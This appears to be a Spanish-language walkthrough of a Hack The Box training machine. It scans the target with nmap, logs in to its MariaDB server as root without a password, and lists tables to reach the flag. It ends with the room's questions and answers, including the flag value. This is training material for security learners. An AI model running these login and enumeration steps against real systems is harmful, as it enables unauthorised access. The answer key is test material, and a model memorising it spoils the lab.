Comprobamos la conexion con 
```bash
ping 10.129.5.216
```

Comprobamos los puertos abiertos con Nmap  (con opción -sV para ver la versión de FTP) (-O para saber el SO)
```bash
nmap -O -sCV -p- 10.129.5.216
```
Salida:
3306/tcp open  mysql?

nos conectamos a la BD
``` 
mysql -h 10.129.5.216 -u root --skip-ssl
``` 
-h : Connect to host. 
-u : User for log-in if not current user.

Una vez estamos dentro, utilizamos los siguientes comando para encontrar información:
SHOW databases; : Prints out the databases we can access. 
USE {database_name}; : Set to use the database named {database_name}. 
SHOW tables; : Prints out the available tables inside the current database. 
SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+


show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+

select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+


select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```

---

>[!Question] During our scan, which port do we find serving MySQL?
>3306

>[!Question] What community-developed MySQL version is the target running?
>MariaDB

>[!Question] When using the MySQL command line client, what switch do we need to use in order to specify a login username?
> -u

>[!Question] Which username allows us to log into this MariaDB instance without providing a password?
> root

>[!Question] In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
> `*`

>[!Question] In SQL, what symbol do we need to end each query with?
> ;

>[!Question] There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?
> htb

>[!Question] Submit root flag
>7b4bec00d1a39e3dd4e021ec3d915da8

